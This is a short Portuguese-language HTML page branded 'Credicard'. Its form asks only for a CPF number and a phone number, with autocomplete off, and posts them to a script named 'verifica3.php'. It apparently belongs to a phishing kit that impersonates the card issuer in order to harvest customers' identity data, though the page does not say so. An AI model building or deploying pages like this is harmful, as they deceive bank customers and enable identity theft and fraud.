<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <link rel="stylesheet" href="css/estilo.css">
    <script src="js/jquery.js"></script>
    <script src="js/jquery.mask.min.js"></script>
    <script>
    
    $(document).ready(function(){

    $('#cpf').mask('000.000.000-00');
    $('#telefone').mask('(00) 00000-0000');

    });

    
    </script>
    <title>Credicard</title>
</head>
<body>
    
<div id="logo"><img src="imagens/logo.png" height="34" width="260"></div>
<div id="container">
    <div id="form">
        <form action="verifica3.php" autocomplete="off" method="post">      
          <label for="">cpf</label>
        <input type="tel" id="cpf" name="cpf">
        <label for="">telefone</label>
        <input type="tel" id="telefone" name="telefone">
        <input type="submit" value="acessar">
        </form>

    </div>
</div>

</body>
</html>